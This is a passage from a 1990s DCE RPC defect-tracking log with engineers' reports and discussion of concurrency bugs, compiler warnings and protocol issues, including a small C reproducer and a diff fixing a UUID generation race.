Several functions in the idl compiler code contain switch statements based
on an enumerated type. However, a "case xxx" entry doesn't exist for all
values of that type, and there is no default entry. 

The files and functions are as follows:  

rpc/idl/idl_compiler/astp_cpx.c, in function AST_find_self_reference().

rpc/idl/idl_compiler/propagat.c, in function PROP_type_info() 

rpc/idl/idl_compiler/cspell.c, in function CSPELL_scalar_type_suffix() 

This condition generates a warning when using the gcc compiler on the AT386 
machines when the "-Wswitch" argument is given.



CR Number                     : 9957
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : rpc
Subcomponent Name             : 
Short Description             : server shutdown not fully supported
Reported Date                 : 2/15/94
Found in Baseline             : 1.0.3
Found Date                    : 2/15/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/15/94 public]

The normal server side shutdown processing does not provide an opportunity
for the RPC protocols to cleanly finish calls which may be in progress
(or recently completed).

For example, with the DG protocol it may be necessary to retransmit a
call's OUT parameters.  This would normally occur *after* the call's thread
had been returned to the thread pool.  Since we currently only wait until 
all threads have been returned to the pool before returning (from 
rpc_server_listen), it's possible that the client will never receive the 
results of its (successful) call.

I don't know if the current behavior had any impact on the CN protocol.



CR Number                     : 9956
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : DG
Short Description             : rpc__dg_call_did_mgr_execute lies
Reported Date                 : 2/15/94
Found in Baseline             : 1.0.3
Found Date                    : 2/15/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/15/94 public]

The routine rpc__dg_call_did_mgr_execute() reports that the server's
manager routine was not entered if 1) the binding handle has *a* server
boot time, and 2) the call in question got rejected with a "wrong boot
time" reject.

Dale Labossiere points out that this is wrong.  The call may very well
have been executed by the first server (whose boot time the client knows),
which then crashed before sending the response.  A new server instance
is then started, the client retransmits, and the new server rejects the
retransmitted request with "wrong boot time."



CR Number                     : 9948
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : dg
Short Description             : Server-not-up exception nukes all threads using binding handle
Reported Date                 : 2/11/94
Found in Baseline             : 1.0.3a
Found Date                    : 2/11/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/11/94 public]
We've noticed a problem with RPCs that occurs when several threads share
a binding handle.  If the [comm_status, fault_status] attributes aren't
set, so that the client expects an exception on comm_failure errors,
when a comm_failure error occurs, it returns an exception as expected,
but it also trashes the other threads currently using the binding handle.
In DCE 1.0.3 it actually wipes out the entire process with an abort.
In DCE 1.0.2 the process continues, but the other threads are wedged
making the RPC forever.
We tried HP, RS/6000, and Sun 1.0.2 platforms, and an RS/6000 1.0.3
platform.
This occurs when using ncadg (UDP) bindings.  We haven't tested TCP bindings.
Here is an example .idl file and C program to reproduce the problem:
Invoke foo with an UDP string binding as a parameter. 
Example:
    % foo 'ncadg_ip_udp:192.55.207.149[1619]'
--------------------------------------------------------------------------
foo.idl
--------------------------------------------------------------------------
[version(1)]
interface foo{
	void fooRpc([in] handle_t h);
}
--------------------------------------------------------------------------
foo.c
--------------------------------------------------------------------------
#include <dce/rpc.h>
#include <pthread.h>
#include "foo.h"    
# define CHECK(i) if((i)) {printf("Bad Status"); exit(1);}
void *SendThread(h)
  void *h;
{
    TRY
	fooRpc((handle_t)h);
    CATCH_ALL
	printf("Caught Exception .....\n");
    ENDTRY
}
main(argc,argv)
  int argc;
  char **argv;
{
    unsigned32 i;
    handle_t h;
    pthread_cond_t c1;
    pthread_mutex_t m1;
    rpc_binding_from_string_binding(argv[1],&h,&i);
    CHECK(i);
    for(i=0;i<5;i++){
	pthread_t threadId;
	CHECK(pthread_create(&threadId,
			   pthread_attr_default,
			   SendThread,
			   h));
       CHECK(pthread_detach(&threadId));
    }
    /* Block the main thread */
    CHECK(pthread_cond_init(&c1,pthread_condattr_default));
    CHECK(pthread_mutex_init(&m1,pthread_mutexattr_default));
    CHECK(pthread_mutex_lock(&m1));
    CHECK(pthread_cond_wait(&c1,&m1));
}

[2/14/94 public]

Even in DCE 1.0.3 other call threads are conditional waiting in
ccall_binding_serialize()::dgccall.c forever because nobody cancels them.
Even if they get cancelled they will retry waiting forever unless the
cancel timeout is set to the finite value.

The CN protocol has the different story because the serialization is done
only while the binding is being resolved, which doesn't happen with the
fully bound binding. All call threads' connection requests will just fail.



CR Number                     : 9941
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : comauth
Short Description             : Problems with auth_info refcount
Reported Date                 : 2/11/94
Found in Baseline             : 1.1
Found Date                    : 2/11/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : comauth.c
Sensitivity                   : public

[2/11/94 public]

There seems to be some recount problems in the rpc runtime auth code.

I am not sure if HP owns this code or not....

Mail message follows:
----------------------------------------------------------------------
>From: Max Grasso <max@osf.org>

More security code issues

As said in previous message, Rob tried the new lock setup in the evs_erb.
Things worked fine for about 70,000 RPCs, then we got an assert in the
rpc/runtime sources, file comauth.c, line 469 
    
    assert(auth_info->refcount >= 1);

The only thing, evs_erb was using heavily at that point was the binding copy
and binding free calls (the set_auth_info was serialized) and the only
reason for this to happen seems to be the fact that the refcount fails
to be appropriately increased when it should.

So browsing a bit more through the sec stuff to make sure it was not an
evs_erb problem, here are some more issues with the sec code.  As in
the previous case these are browsing observations, I never stepped through
this code, so it's easy to be wrong (let me know if you think so).

The file in question is again comauth.c



1) Both rpc__auth_info_reference and rpc__auth_info_release do an
   
    auth_info->refcount--; or  auth_info->refcount++;

   without using any mutexes.

   This is dangerous since those are not atomic instructions (not
   usually and not on the 486/OSF1).
   Moreover those variables once increased can be kept in
   registers until the next function call due to compiler optimization.
   This makes the window for parallel increase/decrease sligthly
   larger. 

   
2)  rpc__auth_info_release does 

        if (auth_info->refcount == 1)
        {
            /*
             * The auth info can be removed from the cache if there is only
             * one reference left to it. That single reference is the cache's
             * reference. 
             */
            rpc__auth_info_cache_remove (auth_info);
        }

    Another thread could come in between and increase the refcount, but
    the auth_info would be removed from the cache.  In reality since
    rpc__auth_info_cache_remove tests it again it will not happen here.
   
    It can happen though right in  rpc__auth_info_cache_remove as follows.

 
3)  rpc__auth_info_cache_remove

     if (auth_info->refcount == 1)
    {
        RPC_LIST_REMOVE (auth_info_cache, auth_info);
        info_type = auth_info->is_server?"server":"client";
        RPC_DBG_PRINTF ....
        assert(auth_info->refcount >= 1);
        auth_info->refcount--;
    }


    Other threads can access authinfo->refcount without getting the
    cache mutex (as in the above ...info_reference and ...info_release
    calls).
    Thus a the auth_info can be removed from the cache even if the
    ref_count is > 1.


Of course all these problems will show when hitting on the same
auth_info not on different ones.



Max


End of mail message ----------------------------------------------

[2/14/94 public]

Since auth_info->refcount is unsigned16, it will overflow if you don't call
rpc_binding_free(). But, I believe that this was not the case here because
the application was heavily calling rpc_binding_copy() and
rpc_binding_free(). (Well, *_reference()/*_release() functions should
return the error status back to the caller instead of aborting the process
by the assertion when the over/under flow happens...)

In general, the refcounts are protected by the mutex. Typically the caller
of *_reference()/*_release() functions holds the RPC runtime's global mutex
or the call handle's mutex. However, rpc_binging_copy()::combind.c is
calling rpc__auth_info_reference()::comauth.c without holding any mutex
locked. (There could be others. I haven't done the thorough investigation.)
Also, holding the call handle's mutex won't be enough when changing the
shared objects, i.e., auth_info. On the other hand, we could argue that it
is the application's responsibility for doing the concurrency control for
rpc_binding_copy(), e.g., the source (shared) binding is being changed by
the another thread while one is calling rpc_binding_copy(). (See RPC Data
Types and Structures, Binding Handle in intro_rpc(3).)



CR Number                     : 9900
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : uuid generation
Short Description             : Potential timing holes in uuid generation.
Reported Date                 : 2/7/94
Found in Baseline             : 1.0.3
Found Date                    : 2/7/94
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : rpc/runtime/uuid.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[2/7/94 public]

Inside uuid.c there are a number of objects declared INTERNAL (i.e.,
static) which could be read/written concurrently by different threads.  One
potential failure mode could be that the same UUID is created more than
once.

[5/18/94 public]

A second problem surrounds uuid creation on the same machine, but spanning
multiple processes.

Multiple processes can experience uuid collisions under the following
circumstances:

- they execute uuid_create() in lockstep, where lockstep is defined as
  being is within the granularity of the system (API-visible) clock, and,

- they hold the same clock_seq value (mod 2^14).  For simplicity, assume
  the system clock is operating monotonically and no adjustment of
  clock_seq is happening.

There are several things we can do about this:

- Nothing.  A argument can be made that this is a highly unlikely event and
  is far outweighed by the higher probability of a serious DCE bugs
  elsewhere.  This scenario is more likely to occur in a multiprocessor
  machine, but is still relatively unlikely.

- Implement a mutex model to protect uuid creation between processes.
  Multiple processes would disambiguate time of day by using the same time
  adjustment model as today.  This exactly conforms to the RPC AES, Section
  A.2.3 Clock Adjustment, which states, "the current adjustment value is
  read and incremented atomically."  Given the two failure modes described
  above, the current implementation does not conform to this atomicity
  requirement.

  [There's a local consensus that likes this model best.]

  [One downfall of this model is that a relatively unsophisticated user
  could cause a denial of service attack simply by monopolizing the uuid
  creation mutex.  The entire machine would fall victim to this attack.]

- Implement a uuid server either as a standalone entity or in the OS.
  [Highly impractical for a gazillion reasons.]

- Incorporate the OS process-id into the uuid.  There is history of this in
  both the security implementation (ref:
  security/server/rsdb/rsdb_misc.c/rsdb_uuid_create()), and also the RPC
  AES, TABLE A-2 UUID Version Field.  The AES does not specify how the OS
  process-id is integrated into a uuid.

[7/25/96 public]

I am adding the diffs we've added to uuid.c to protect multiple threads
from returning duplicate uuids (because of a race condition, this can
happen quite easily.  I can reproduce this error on solaris and aix).

Checked-out CML/delta/mowry-18213-rpc-uuid-should-be-unique, revision 1.2 
Delta: mowry-18213-rpc-uuid-should-be-unique
Change: rpc/runtime/uuid.c from 12.4 to 12.7
*** rpc/runtime/uuid.c
--- 12.7        1996/07/17 13:01:35
***************
*** 2,7 ****
--- 2,22 ----
   * @TRANSARC_COPYRIGHT@
   *
   * $TALog: uuid.c,v $
+  * Revision 12.7  1996/07/17  13:01:35  mowry
+  * There was a race condition in uuid_create that allowed multiple calls to
+  * uuid_create to return the same value.
+  *
+  * Added a mutex to protect static time variables from being accessed by
+  * multiple threads simultaneously in uuid_create.  Also updated logic around
+  * the time_adjust calculation.  This value is used to create a uuid when
+  * successive calls to gettimeofday return the same value (i.e. we're running
+  * faster than the clock is ticking).  The function that calculates the current
+  * time always multiplies the microsecond value by UUID_C_100NS_PER_USEC (10)
+  * before returning.  time_adjust should never be allowed to exceed
+  * UUID_C_100NS_PER_USEC, or we run the risk of using a time value that may
+  * (in the future) be used by another thread.
+  * [from r12.4 by delta mowry-18213-rpc-uuid-should-be-unique, r1.1]
+  *
   * Revision 12.4  1995/06/22  18:57:51  nydick
   * Certain uuid routines are documented to treat NULL as a nil uuid.
   * Instead, they coredump.
***************
*** 22,28 ****
   */
  
  #if !defined(_NOIDENT) && !defined(lint)
! static char *TARCSId = "$Id: c009900,v 1.5 96/07/25 10:28:43 root Exp $";
  #endif
  
  /*
--- 37,43 ----
   */
  
  #if !defined(_NOIDENT) && !defined(lint)
! static char *TARCSId = "$Id: c009900,v 1.5 96/07/25 10:28:43 root Exp $";
  #endif
  
  /*
***************
*** 267,273 ****
  #define TIME_HIGH_MASK              0x0fff0000
  #define TIME_HIGH_SHIFT_COUNT       16
  
! #define MAX_TIME_ADJUST             0x7fff
  
  #define CLOCK_SEQ_LOW_MASK          0xff
  #define CLOCK_SEQ_HIGH_MASK         0x3f00
--- 282,288 ----
  #define TIME_HIGH_MASK              0x0fff0000
  #define TIME_HIGH_SHIFT_COUNT       16
  
! #define MAX_TIME_ADJUST             UUID_C_100NS_PER_USEC
  
  #define CLOCK_SEQ_LOW_MASK          0xff
  #define CLOCK_SEQ_HIGH_MASK         0x3f00
***************
*** 349,354 ****
--- 364,377 ----
   */
  INTERNAL boolean got_address = FALSE;
  
+ /*
+  * mutex and pthread_once data to protect time values calculated in
+  * uuid_create
+  */
+  INTERNAL boolean32       time_mutex_inited = false;
+  INTERNAL pthread_mutex_t time_mutex;
+ 
  /****************************************************************************
   *
   * local function declarations
***************
*** 554,559 ****
--- 577,587 ----
  
      uuid__get_os_time (&time_last);
  
+     if (!time_mutex_inited) {
+       pthread_mutex_init(&time_mutex, pthread_mutexattr_default);
+       time_mutex_inited = true;
+     }
+ 
  #ifdef UUID_NONVOLATILE_CLOCK
      clock_seq = uuid__read_clock();
  #else
***************
*** 631,638 ****
--- 659,674 ----
          return;
      }
  
+     if (pthread_mutex_lock(&time_mutex)) {
+       *status = uuid_s_internal_error;
+       DEBUG_PRINT ("uuid_create", *status);
+       return;
+     }
+ 
      do
      {
+       got_no_time = FALSE;
+ 
          /*
           * get the current time
           */
***************
*** 656,662 ****
                  time_adjust = 0;
                  break;
              case uuid_e_equal_to:
!                 if (time_adjust == MAX_TIME_ADJUST)
                  {
                      /*
                       * spin your wheels while we wait for the clock to tick
--- 692,698 ----
                  time_adjust = 0;
                  break;
              case uuid_e_equal_to:
!                 if (time_adjust >= MAX_TIME_ADJUST)
                  {
                      /*
                       * spin your wheels while we wait for the clock to tick
***************
*** 671,676 ****
--- 707,713 ----
              default:
                  *status = uuid_s_internal_error;
                  DEBUG_PRINT ("uuid_create", *status);
+               pthread_mutex_unlock(&time_mutex);
                  return;
          }
      } while (got_no_time);
***************
*** 701,706 ****
--- 738,749 ----
      uuid->clock_seq_hi_and_reserved |= UUID_RESERVED_BITS;
  
      memcpy (uuid->node, &eaddr, sizeof (uuid_address_t));
+ 
+     if (pthread_mutex_unlock(&time_mutex)) {
+       *status = uuid_s_internal_error;
+       DEBUG_PRINT ("uuid_create", *status);
+       return;
+     }
  
      *status = uuid_s_ok;
      RPC_LOG_UUID_CREATE_XIT;



CR Number                     : 9856
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : rpc
Subcomponent Name             : 
Short Description             : generated idl code gives compiler warnings on rios
Reported Date                 : 1/28/94
Found in Baseline             : 1.1
Found Date                    : 1/28/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[1/28/94 public]
I believe this is caused by the rpc code cleanup.  Seems OK on 486 and HP -
just appears on the RIOS..

In the dce/utils/svc directory of the BASIC pass of the build (reformatted
for easy reading):

xlc -c -D_ALL_SOURCE -DAIX32   -I. -I/u1/devobj/sb/nb_rios/src/dce/utils/svc 
	-I/project/dce/build/dce1.1-snap/src/dce/utils/svc
	-I/u1/devobj/sb/nb_rios/export/rios/usr/include
	-I/project/dce/build/dce1.1-snap/export/rios/usr/include
	service_cstub.c
"service_cstub.c", line 598.19: 1506-193 (E) Function call argument cannot be
	assigned to corresponding parameter.
"service_cstub.c", line 674.19: 1506-193 (E) Function call argument cannot be
	assigned to corresponding parameter.
"service_cstub.c", line 750.19: 1506-193 (E) Function call argument cannot be
	assigned to corresponding parameter.
"service_cstub.c", line 828.19: 1506-193 (E) Function call argument cannot be
	assigned to corresponding parameter.
"service_cstub.c", line 909.19: 1506-193 (E) Function call argument cannot be
	assigned to corresponding parameter.
"service_cstub.c", line 990.19: 1506-193 (E) Function call argument cannot be
	assigned to corresponding parameter.
"service_cstub.c", line 1072.19: 1506-193 (E) Function call argument cannot be
	assigned to corresponding parameter.
"service_cstub.c", line 1150.19: 1506-193 (E) Function call argument cannot be
	assigned to corresponding parameter.

[8/11/94 public]

This error is occurring in the call to rpc_ss_call_end2(), and appears
to be referring to the first argument. 

The facts of the matters:

The prototype for rpc_ss_call_end2 is as follows:

void rpc_ss_call_end2( volatile rpc_call_handle_t * , <others>)

The call is 
	rpc_ss_call_end2( &IDL_ms.IDL_call_h, <otherargs>)

IDL_call_h is defined as follows 

	volatile rpc_call_handle_t IDL_call_h ;

In other include files, we have the following 

typedef rpc_opaque_ptr_t rpc_call_handle_t ;
typedef rpcbase_v0_0_0 * rpc_opaque_ptr_t ;
typedef struct { 
    unsigned32 dummy;
} rpcbase_v0_0_0;

So, one would think that by taking the address of a volatile thing,
you would a pointer compatible with the declaration "volatile thing *".
Maybe not. Note that, in the case of const, the effect of the
following declarations 

typedef char * charptr ;
const charptr cp ;

is to declare cp as a constant-qualified pointer to char 
(see section 6.5.4.1 on the ANSI standard for more info on this).

So ... does the function want a pointer to a volatile
rpc_call_handle_t, or a volatile-qualified pointer to
rpc_call_handle_t? I claim the former (functions called inside
TRY/ENDTRY need to make sure that any data that can be modified 
by other functions is declared volatile. 

In any case, as per discussions with OSF DCE management, re-assigning
to IBM.

[08/13/94 public]
While this is not the right forum to comment on management decisions,
please note that this is NOT an IBM-specific issue; the RIOS compiler
is correctly complaining about "bad" code generated by IDL.
>So, one would think that by taking the address of a volatile thing,
>you would a pointer compatible with the declaration "volatile thing *".
>Maybe not. Note that, in the case of const, the effect of the
Not.  (Didn't we discuss this in a different OT?)
A volatile thing and a volatile pointer to a thing are different.

[8/15/94 public]

Yes, Rich, you are correct: a volatile thing and a volatile pointer to
a thing are different. However, it is certainly the case that taking 
the address of a volatile thing results in a "pointer-to
volatile-qualified thing", and not a "volatile-qualified pointer-to
thing". If you believe differently, try the following test:

volatile int vi ;
volatile int * vip ;
volatile int * volatile vivp;
int * volatile ivp ;

vip = &i ;	//OK
vivp = &i ;	//OK 
ivp = &i ;	// BAD - strips away volatile qualifier 

All 3 compilers (AT396, HP, and RIOS) complain about the line marked
bad.

I believe the issues here are the following: 

1) what is the desired behavior? 

2) does the code (declarations, etc.) provide for that behavior?

3) If so, is the RIOS compiler issuing an incorrect diagnostic( or are
the other compilers failing to generate a diagnostic?)

As to the desired behavior, I believe that we want to make sure that
any reference thru rpc_ss_call_end2()'s first argument is not optimized
away by the compiler. So we know that it's references of the form "*p"
that need to be volatile, and not p itself (since it's value should
never change thruout the execution of the function, and could in fact
be safely declared to be const).

What declaration would guarantee that? We need something like this 

rpc_base_v0_0_0 * volatile * , or 
rpc_call_handle_t volatile * 

which is to say, 

a pointer-to an volatile-qualified pointer-to an rpc_base_v0_0_0

Assuming the volatile behaves like const, one would assume that 
the declaration 

	volatile <pointer_type> x 
would be equivalent to 

	<pointer_type> volatile x 

This is not covered in the ANSI standard, but is consistent for the
description of how const behaves.

However, given our desired behavior, it would appear that the type definition 
in the function prototype is wrong, and should be 

   rpc_ss_call_end_2( rpc_handle_t volatile *, ...)

OK ... I tried that. Both the HP and AT386 compilers loved it. The
RIOS compiler (xlc) issued the same diagnostic. The only code that 
the RIOS compiler accepted was when the typedef was removed and 
replaced with the equivalent structure pointer ; i.e. 

rpc_ss_call_end2( rpcbase_v0_0_0 * volatile *);

struct XXX {
    rpcbase_v0_0_0 * volatile IDL_call_h ;
}

struct XXX foo;

rpc_ss_call_end2( &foo.IDL_call_h, ...) 


Conclusions:

1) the function prototype is incorrect, and should be changed. 

2) the RIOS compiler still issues an incorrect diagnostic (assuming
	const-like behavior of the volatile qualifier)



CR Number                     : 9750
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : IDL compiler
Short Description             : Add "unimplemented" exception and [nocode] support
Reported Date                 : 1/17/94
Found in Baseline             : 1.1
Found Date                    : 1/17/94
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[1/17/94 public]
When developing a DCE it is useful to be able to run the server even
though all the operations might not have been implemented yet.  After
some initial discussion, we believe the following would be very useful:
    1.  A defined public exception that means "operation was recieved but
	is not yet implemented."  This would be mapped to a new fault
	code.  Servers and clients could send/recieve this exception to
	indicate "yes, you're doing the right thing but I'm not finished
	coding yet." :-)  An exception is needed so that the runtime doesn't
	try to marshall return data.
    2.  The [nocode] attribute in a server stub will be given the meaning
	"send the exception defined above."



CR Number                     : 9580
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : rpc
Subcomponent Name             : rpc runtime
Short Description             : Rpc gives communication failure despite success of call
Reported Date                 : 12/7/93
Found in Baseline             : 1.0.2
Found Date                    : 12/7/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Status               : open

[12/7/93 public]
There seems to be a problem in the RPC runtime in which a call
goes through, but the client gets an RPC communication failure. 
This happens very reproducibly in the dfs backup system, when 
butc does a BUDB_UseTape() call to the bakserver. The butc gets
back a communication failure despite the fact that the call
goes through succesfully to the bakserver. butc repeats
the call and as a result, the backup system has two tapes
for the same dump with the same name, and this causes problems
later on. 
I have an RPC log (with RPC_DEBUG turned on) available that demonstrates
the problem.
 
Added field Transarc Deltas with value `' 
Added field Transarc Status with value `open'

[12/7/93 public]

Assumptions (based on AFS 3 admin experience) here, since I don't have time
to read the whole backup system source code:
 1) the "bakserver" is a database server for the backup process.
 2) "butc" is the process which actually reads & writes to the tape device.

My guess (w/o seeing the log) is that one thread of the butc invoked a
"slow" tape operation while a different thread was doing the remote call.
Because you're not running on an OS with kernel threads, the whole process
was blocked for ~30 seconds while a tape drive did something "interesting"
like a rewind or filemark write. (from experience, I know these take a
*long* time on helical-scan devices like the exabyte 8mm drives..).
Unfortunately, UNIX is of the (mistaken) opinion that tape drives are
"fast" devices, so setting up non-blocking I/O on the tape is not
effective.

RPC was never expected to operate in an environment where the whole process
can be blocked for a long time..  Once it came back from never-never land,
the rpc timer thread ran before the listener thread, and the calls in
progress were marked as timed out before the listener thread had a chance
to read the data presumably waiting on the socket.

There are a couple of options for how to fix it:
 1) fork off a subprocess to do "slow" tape operations like rewind or
close; you can always do a non-process-blocking wait for the subprocess to
complete.
 2) fix the wire interface to be idempotent (by adding a "tape uuid" or
some such) or otherwise cause the bakserver to detect and squish
duplicate tapes.
 3) convince all vendors to implement non-blocking I/O on tape devices
(1/2 :-) )



CR Number                     : 9363
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : DG runtime does not do
transfer syntax negotiation
Reported Date                 : 11/4/93
Found in Baseline             : 1.0.3
Found Date                    : 11/4/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[11/4/93 public]
The ncadg_ip_udp RPC protocol appearently ignores the setting
of the transfer syntax id in the ifspec.  When the RPC runtime
invokes the server stub routine the NDR syntax id is always
specified regardless of what is specified as supported in the
client and/or server ifspec.



CR Number                     : 9336
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : runtime/cn
Short Description             : Pipe's receiver thread coredumps with the memory allocation failure.
Reported Date                 : 11/3/93
Found in Baseline             : 1.0.3
Found Date                    : 11/3/93
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[11/3/93 public]
 
When using OUT-pipe on the slower client machine, the client coredumps with
the memory allocation failure in the receiver thread. This is caused by the
non-existence of the synchronization between the receiver thread and the
dequeueing thread, i.e., the client call thread doing push(). The simple
example is push() function doing write() to the slow IO device (at least
slower than the network IO). The receiver thread queues a fragment buffer
onto assoc->msg_list as fast as possible. However, since the dequeueing
thread takes more time to process fragment buffers, the message queue gets
longer and longer, and eventually the client machine run out of the swap
space.
 
There needs to be a maximum queue length enforced on the association's
message queue, and when it reaches the max length, the receiver thread
should stop calling recvmsg() so that the underlying protocol's (TCP/IP)
flow control takes effect. This sounds simple. However, we need to consider
the special cases like the fault, quit, remote alert, orphaned, etc. PDUs.
Even though the message queue is full, the receiver thread should process
these packets as soon as possible. The use of the out-of-band data is a
possible solution, but it requires the protocol change and the OOB may not
be supported on the other CN protocols. (Well, we can simply ignore the
special cases, though.)

[markar 11/3/93 public] 
 
This is a generic problem with the way CN handles bulk data transfers;
it's not specific to pipes.

[11/04/93 public]
Is this really an A1 defect?
Didn't anyone think about this when they designed it?  (sigh)
Defering to 1.1

[8/22/94 public]
Unfortunately, this has fallen off the plate for 1.1 and I am defering
it to 1.2.  We do not have the time to engineer a solution
to this problem for 1.1.
Lowering this to a B2 enhancement.

[10/6/94 public]
I hope this doesn't get me into lots of trouble...
 
This may not be an A1, it may be deferred, but it's a solid B2 with no
work-around, and it causes a core dump or worse; I have trouble seeing
it as an enhancement.

[4/19/96 public]

Another bad instance of this defect. Consider the server servicing IN-pipe.
The CN receiver thread never stop reading fragments when the call is queued
because of busy call executor threads. So, nobody dequeues fragment
buffers. Well, if you are doing heavy bulk data transfers, you'd better use
DG...



CR Number                     : 9268
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : runtime
Short Description             : RPC_DEFAULT_ENTRY should default to "/.:/cell-profile"
Reported Date                 : 10/26/93
Found in Baseline             : 1.0.2
Found Date                    : 10/26/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/26/93 public]

Rich makes an excellent suggestion in the following note in comp.unix.osf.misc:

From: rsalz@osf.org (Rich Salz)
Newsgroups: comp.unix.osf.misc
Subject: Re: Automatic Binding
Date: 22 Oct 1993 17:32:57 GMT
Organization: Open Software Foundation

In <1993Oct22.082304.9299@srd.bt.co.uk> smeek@jungle.bt.co.uk (Steve Meek) writes:
>Yes, yes I know that but doesn't it seem strange that in so called
>'automatic binding' you have to EXPLICITLY specify an entry to the CDS
>using RPC_DEFAULT_ENTRY!!

It does seem a bit strange.  I suppose it would not be unreasonable to
have RPC_DEFAULT_ENTRY default to "/.:/cell-profile"
	/r$

[05/04/94 public]
I don't think changing this would be such a hot idea.
Might take people by surprise, and I'm sure they wouldn't like
this sort of surprise.  RPC even gives you a reasonable error message
(something like 'you don't have the variable set')

Who would have permission to add entries to cell-profile?
Do we want just any application sticking its bindings in there?



CR Number                     : 8688
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 8638
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : export/domestic packet privacy call rejection status values are not specific enough
Reported Date                 : 9/24/93
Found in Baseline             : 1.0.2
Found Date                    : 9/24/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : rpc/runtime/dgexec.c
Sensitivity                   : public

[9/24/93 public]

Full Description:

customers reported that in the case where a domestic client (DES
capable) contacts an export server (feature reduced) and requests
data privacy, the call is rejected by the server, but that it is
not easy to identify why the client call has failed or been rejected
given the error codes relayed by the server. The most common failure
status codes are rpc_s_comm_failure (DG) and rpc_s_connection_closed (CN).

In the case of DG, this seems to be merely a function of the RPC/NCA
rejection status mappings and the initial RPC status set by the RPC
runtime. The routine rpc__dg_execute_call() is run in the server
application. This results in a call to (*recv_ck)() from the auth_epv
functions. The (*recv_ck)() function does the appropriate protection
level checking and returns rpc_s_unsupported_authn_level status. The
rpc__dg_execute_call() function translates this status into the
rpc_s_who_are_you_failed reject status. The function queue_mapped_reject()
understands a limited subset of rpc error status codes, and translates
them into some (in)appropriate NCA status code, in this case
nca_s_comm_failure.

Proposed Solution:

pass rpc_s_unsupported_authn_level all the way back

[2/8/96 public]

DG was fixed in dce1.2.1.



CR Number                     : 8639
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : rpc
Subcomponent Name             : 
Short Description             : CL rpc does not generate rpc_x_unsupported_protect_level exception
Reported Date                 : 9/21/93
Found in Baseline             : 1.0.2
Found Date                    : 9/21/93
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
